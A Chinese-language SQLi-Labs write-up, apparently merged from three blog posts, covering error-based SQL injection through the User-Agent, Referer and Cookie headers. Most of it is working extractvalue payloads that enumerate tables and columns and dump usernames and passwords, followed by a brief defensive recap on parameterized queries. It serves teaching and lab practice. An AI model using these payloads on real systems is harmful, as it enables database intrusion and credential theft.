---
title: "SQL 注入中的请求头与 Cookie 输入面"
description: 合并三篇 SQLi-Labs 实验，比较 User-Agent、Referer 与 Cookie 进入数据库查询时的注入风险，强调所有外部输入均不可信。
excerpt: 合并三篇 SQLi-Labs 实验，比较 User-Agent、Referer 与 Cookie 进入数据库查询时的注入风险，强调所有外部输入均不可信。
author: Lee
disableNunjucks: true
date: 2025-05-21 20:37:46
updated: 2026-09-04 00:00:00
categories:
  - SQL注入专题
tags:
  - SQLi-Labs
  - SQL注入
  - HTTP请求头
  - Cookie
article_status: 待复验
difficulty: 中级
original_sources:
  - https://blog.csdn.net/2403_88102829/article/details/148122009
  - https://blog.csdn.net/2403_88102829/article/details/148122969
  - https://blog.csdn.net/2403_88102829/article/details/148123432
---

> **文章状态：待复验**  
> 本文由 Lee 的 CSDN 原创学习记录迁移并重新整理。以下操作仅限自建环境、CTF 与明确授权靶场，请勿用于未授权目标。

## 学习目标

- 识别表单之外的请求头和 Cookie 输入面
- 理解日志、审计和登录逻辑中的二次数据流
- 为所有外部输入统一实施参数化查询

## 实验说明

- 难度：中级
- 范围：本地或公开授权靶场
- 复验状态：正文已完成格式迁移，关键结论将在后续使用固定环境重新验证

## 原始实验记录

## User-Agent 注入

### 一、判断注入类型

先在用户名和密码框尝试判断，发现都得不到需要的回显

所以查看源码

![实验截图 1](/images/csdn/148122009/01.png)

可以发现username和password的输入后端都做了检查，没法直接注入

![实验截图 2](/images/csdn/148122009/02.png)

所以我们尝试uagent注入

### User-Agent 输入点

-   没有url解码处理
-   只识别原始空格，+，%20都不作为空格解析
-   在User-agent字段中注入

先用一组密码登录，bp抓包

![实验截图 3](/images/csdn/148122009/03.png)

构造判断的payload

```
User-Agent: 1
User-Agent: 1'
User-Agent: 1"
User-Agent: 1')
User-Agent: 1")
```

单引号的时候产生不同的回显

![实验截图 4](/images/csdn/148122009/04.png)

其余均为

![实验截图 5](/images/csdn/148122009/05.png)

确定为单引号字符型，尝试闭合

闭合成功但报错，其他几种情况闭合均无回显，所以我们尝试报错注入

### 二、验证注入行为

#### 1. 获取数据库名

```
User-Agent: 1' and extractvalue(1,concat(0x7e,(database())))='1
```

![实验截图 6](/images/csdn/148122009/06.png)

#### 2. 获取表名

```
User-Agent: 1' and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))='1
```

![实验截图 7](/images/csdn/148122009/07.png)

#### 3. 获取列名

```
User-Agent: 1' and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')))='1
```

![实验截图 8](/images/csdn/148122009/08.png)

#### 4. 获取数据

看数据量

```
User-Agent: 1' and extractvalue(1,concat(0x7e,(select count(*) from users)))='
```

![实验截图 9](/images/csdn/148122009/09.png)

由于报错信息长度有限，实验中分段验证查询结果：

```
extractvalue(1,concat(0x7e, substring((select group_concat(username,0x3a,password) from users),1,32)))
extractvalue(1,concat(0x7e, substring((select group_concat(username,0x3a,password) from users),32,32)))
```

![实验截图 10](/images/csdn/148122009/10.png)

![实验截图 11](/images/csdn/148122009/11.png)

## Referer 注入

### 一、判断注入类型

同理前一关，bp抓包

![实验截图 1](/images/csdn/148122969/01.png)

这里尝试referer注入

![实验截图 2](/images/csdn/148122969/02.png)

判断流程与前一节相同，可参见本文“User-Agent 注入”部分。

单引号，尝试报错注入

### 二、验证注入行为

#### 1. 获取数据库名

```
Referer: 1' and extractvalue(1,concat(0x7e,(database())))='1
```

![实验截图 3](/images/csdn/148122969/03.png)

与前一关相同，不再过多赘述

## Cookie 注入

### 一、判断注入类型

输入密码，bp抓包

![实验截图 1](/images/csdn/148123432/01.png)

返回这个页面

![实验截图 2](/images/csdn/148123432/02.png)

对此页面再次进行抓包

![实验截图 3](/images/csdn/148123432/03.png)

```
Cookie: uname=1
Cookie: uname=1'
Cookie: uname=1"
Cookie: uname=1')
Cookie: uname=1")
```

单引号时产生报错，尝试闭合

![实验截图 4](/images/csdn/148123432/04.png)

闭合成功

### 二、验证注入行为

#### 1. 获取数据库名

```
Cookie: uname=1' and extractvalue(1,concat(0x7e,(database())))#
```

 ![实验截图 5](/images/csdn/148123432/05.png)

#### 2. 获取表名

```
Cookie: uname=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))#
```

 ![实验截图 6](/images/csdn/148123432/06.png)

#### 3. 获取列名

```
Cookie: uname=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')))#
```

 ![实验截图 7](/images/csdn/148123432/07.png)

#### 4. 获取数据

查表的数量

```
Cookie: uname=1' and extractvalue(1,concat(0x7e,(select count(*) from users)))#
```

![实验截图 8](/images/csdn/148123432/08.png)

```
Cookie: uname=1' and extractvalue(1,concat(0x7e, substring((select group_concat(username,0x3a,password) from users),1,32)))#
Cookie: uname=1' and extractvalue(1,concat(0x7e, substring((select group_concat(username,0x3a,password) from users),32,32)))#
```

 ![实验截图 9](/images/csdn/148123432/09.png)

 ![实验截图 10](/images/csdn/148123432/10.png)

## 防御与复盘

- User-Agent、Referer、Cookie 和代理头都属于不可信输入。
- 日志或审计写库同样必须使用参数化语句并限制字段长度。
- 避免把 WAF 作为唯一防线，应在应用数据访问层消除字符串拼接。

## 原文出处

- [CSDN 原创记录 1](https://blog.csdn.net/2403_88102829/article/details/148122009)
- [CSDN 原创记录 2](https://blog.csdn.net/2403_88102829/article/details/148122969)
- [CSDN 原创记录 3](https://blog.csdn.net/2403_88102829/article/details/148123432)
